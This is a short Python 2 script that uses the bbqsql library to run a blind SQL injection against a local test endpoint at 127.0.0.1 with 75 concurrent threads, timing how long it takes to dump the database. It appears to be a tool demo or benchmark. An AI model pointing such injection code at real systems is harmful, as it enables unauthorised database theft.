import bbqsql
from time import time

url = bbqsql.Query('http://127.0.0.1:8090/boolean?${query}')
bh = bbqsql.BlindHTTP(url=url)
start = time()
results = bh.run(concurrency=75)
stop = time()

print "dumped db in %f seconds" % (stop-start)
